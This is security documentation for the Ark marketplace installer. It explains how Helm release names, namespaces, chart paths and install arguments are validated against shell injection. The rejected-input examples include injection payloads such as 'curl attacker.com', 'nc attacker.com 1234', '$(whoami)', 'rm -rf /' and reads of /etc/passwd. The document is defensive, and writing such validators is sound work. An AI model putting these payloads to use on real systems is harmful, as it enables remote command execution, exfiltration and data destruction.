# Marketplace Installation Security

Ark validates all Helm installation arguments when installing marketplace items to protect against shell injection and arbitrary code execution vulnerabilities. These security checks ensure that marketplace installations cannot execute malicious commands or access unauthorized resources.

## How Installation Works

When you install a marketplace item via the dashboard or API, Ark:

1. **Validates all inputs** (Helm release name, namespace, chart path, install arguments)
2. **Uses secure subprocess execution** (`spawn` with `shell: false`)
3. **Passes arguments as an array** (no shell string concatenation)
4. **Blocks dangerous flags** (default deny policy)

This defense-in-depth approach eliminates shell injection vulnerabilities.

## Always-On Security Checks

The following validations are always active and cannot be disabled:

### Helm Release Name Validation
**Protects against:** Shell injection via semicolons, pipes, command substitution

Helm release names must follow RFC 1123 DNS label standards:

```yaml
# ✅ Valid
helmReleaseName: "phoenix"
helmReleaseName: "my-service-v2"
helmReleaseName: "app.dev.v1"

# ❌ Rejected
helmReleaseName: "app; curl attacker.com"           # Shell injection attempt
helmReleaseName: "app$(whoami)"                      # Command substitution
helmReleaseName: "app | nc attacker.com 1234"        # Pipe injection
helmReleaseName: "a".repeat(54)                      # Too long (>53 chars)
helmReleaseName: "My-Service"                        # Uppercase not allowed
```

**Requirements:**
- Max 53 characters
- Lowercase alphanumeric, hyphens, and dots only
- Must start and end with alphanumeric character
- Pattern: `/^[a-z0-9]([-a-z0-9]*[a-z0-9])?(\.[a-z0-9]([-a-z0-9]*[a-z0-9])?)*$/`

### Namespace Validation
**Protects against:** Shell injection, Kubernetes namespace traversal

Namespaces must follow Kubernetes RFC 1123 naming rules:

```yaml
# ✅ Valid
namespace: "default"
namespace: "phoenix"
namespace: "monitoring-prod"

# ❌ Rejected
namespace: "default; curl attacker.com"  # Shell injection
namespace: "my.namespace"                 # Dots not allowed (RFC 1123)
namespace: "Production"                   # Uppercase not allowed
```

**Requirements:**
- Max 63 characters
- Lowercase alphanumeric and hyphens only (no dots)
- Must start and end with alphanumeric character
- Pattern: `/^[a-z0-9]([-a-z0-9]*[a-z0-9])?$/`

### Chart Path Validation
**Protects against:** Local file access, arbitrary URL schemes

Chart paths must use OCI or HTTPS protocols only:

```yaml
# ✅ Valid
chartPath: "oci://ghcr.io/mckinsey/agents-at-scale-marketplace/charts/phoenix"
chartPath: "https://charts.example.com/phoenix-1.0.0.tgz"

# ❌ Rejected
chartPath: "file:///etc/passwd"                    # Local file access
chartPath: "ftp://internal.server/chart.tgz"       # Non-HTTPS protocol
chartPath: "../../../etc/passwd"                   # Path traversal
chartPath: "oci://example.com/chart; rm -rf /"    # Shell metacharacters
```

**Requirements:**
- Must start with `oci://` or `https://`
- No shell metacharacters: `;`, `|`, `&`, `$`, `` ` ``, `(`, `)`, `{`, `}`, `[`, `]`, `<`, `>`, `\`, `'`, `"`

### Install Arguments Validation
**Protects against:** Arbitrary code execution, file access, dangerous Helm features

Helm install arguments use an **allowlist-based approach** - only explicitly permitted flags are allowed.

See the [implementation](https://github.com/mckinsey/agents-at-scale-ark/blob/main/services/ark-dashboard/ark-dashboard/lib/utils/helm-validation.ts#L63) for the complete list.

#### Allowed Boolean Flags

```yaml
# ✅ Valid
installArgs: ["--create-namespace"]
installArgs: ["--wait", "--atomic"]
installArgs: ["--create-namespace", "--wait", "--timeout", "5m"]

# ❌ Rejected
installArgs: ["--post-renderer", "/tmp/evil.sh"]   # Code execution risk
installArgs: ["--set-file", "config=/etc/passwd"]  # File access risk
installArgs: ["--kube-context", "production"]      # Context switching
```

**Allowed boolean flags:**
- `--create-namespace` - Create namespace if it doesn't exist
- `--wait` - Wait for all resources to be ready
- `--atomic` - Rollback on failure
- `--cleanup-on-fail` - Delete resources on failed install
- `--debug` - Enable debug logging
- `--dry-run` - Simulate installation
- `--force` - Force resource updates
- `--disable-openapi-validation` - Skip OpenAPI validation

#### Flags with Value Validation

Some flags require values with strict format validation to prevent injection:

##### `--timeout` Flag

```yaml
# ✅ Valid
installArgs: ["--timeout", "5m"]
installArgs: ["--timeout", "300s"]
installArgs: ["--timeout", "1h"]

# ❌ Rejected
installArgs: ["--timeout", "5 minutes"]      # Invalid format
installArgs: ["--timeout", "$(whoami)"]      # Command injection
installArgs: ["--timeout"]                   # Missing value
```

**Requirements:**
- Format: `\d+[smh]` (digits followed by s, m, or h)
- Examples: `30s`, `5m`, `2h`

See [timeout validation](https://github.com/mckinsey/agents-at-scale-ark/blob/main/services/ark-dashboard/ark-dashboard/lib/utils/helm-validation.ts#L87) implementation.

##### `--set` and `--set-string` Flags

```yaml
# ✅ Valid
installArgs: ["--set", "replicas=3"]
installArgs: ["--set", "image.tag=v1.2.3"]
installArgs: ["--set-string", "config.url=https://example.com"]

# ❌ Rejected
installArgs: ["--set", "key=$(whoami)"]           # Command substitution
installArgs: ["--set", "key=value; curl evil"]    # Shell injection
installArgs: ["--set", "key='value'"]             # Quotes not allowed
installArgs: ["--set"]                            # Missing value
```

**Requirements:**
- Format: `key=value` (no shell metacharacters)
- Allowed in value: `\w\s.,@:/\-` (alphanumeric, whitespace, common safe chars)
- Blocked: Quotes, backticks, semicolons, pipes, redirects

See [set validation](https://github.com/mckinsey/agents-at-scale-ark/blob/main/services/ark-dashboard/ark-dashboard/lib/utils/helm-validation.ts#L100) implementation.

#### Explicitly Blocked Flags

These dangerous flags are rejected even if somehow added to the allowlist:

```yaml
# ❌ Always rejected
installArgs: ["--set-file", "config=/etc/passwd"]          # File system access
installArgs: ["--post-renderer", "/tmp/script.sh"]         # Arbitrary code execution
installArgs: ["--post-renderer-args", "--privileged"]      # Renderer arguments
installArgs: ["--kube-context", "production"]              # Context switching
```

**Why these are dangerous:**
- `--set-file` - Reads arbitrary files from the server filesystem
- `--post-renderer` - Executes arbitrary binaries/scripts
- `--post-renderer-args` - Arguments to post-renderer
- `--kube-context` - Switches Kubernetes contexts (potential privilege escalation)

## Validation Errors

When installation validation fails, you'll see a 400 error with details:

```
Validation failed: Helm release name must consist of lowercase letters, numbers, hyphens, and dots, and must start and end with an alphanumeric character

Validation failed: Chart path must be a valid OCI (oci://) or HTTPS URL without shell metacharacters

Validation failed: Disallowed install argument: --post-renderer

Validation failed: Invalid timeout format (expected: 5m, 300s, 1h)

Validation failed: Invalid --set value format (no shell metacharacters allowed)
```

## Example Configurations

### Basic Service Installation

```json
{
  "helmReleaseName": "phoenix",
  "chartPath": "oci://ghcr.io/mckinsey/agents-at-scale-marketplace/charts/phoenix",
  "namespace": "observability",
  "installArgs": ["--create-namespace", "--wait"]
}
```

### Installation with Timeout and Values

```json
{
  "helmReleaseName": "langfuse",
  "chartPath": "oci://ghcr.io/mckinsey/agents-at-scale-marketplace/charts/langfuse",
  "namespace": "telemetry",
  "installArgs": [
    "--create-namespace",
    "--wait",
    "--timeout", "10m",
    "--set", "replicas=3",
    "--set", "image.tag=v2.1.0"
  ]
}
```

### Atomic Installation with Cleanup

```json
{
  "helmReleaseName": "ark-sandbox",
  "chartPath": "oci://ghcr.io/mckinsey/agents-at-scale-marketplace/charts/ark-sandbox",
  "namespace": "default",
  "installArgs": [
    "--create-namespace",
    "--wait",
    "--atomic",
    "--cleanup-on-fail",
    "--timeout", "5m"
  ]
}
```

- **API endpoint**: [`app/api/marketplace/[id]/install/route.ts`](https://github.com/mckinsey/agents-at-scale-ark/blob/main/services/ark-dashboard/ark-dashboard/app/api/marketplace/%5Bid%5D/install/route.ts)

### Defense-in-Depth Layers

1. **Input Validation** - Zod schemas with RFC-compliant regex patterns
2. **Safe API** - `spawn()` instead of `exec()`
3. **No Shell Invocation** - `shell: false` prevents shell interpretation
4. **Allowlist Policy** - Default deny, explicit allow

Even if one layer fails, the others prevent exploitation.
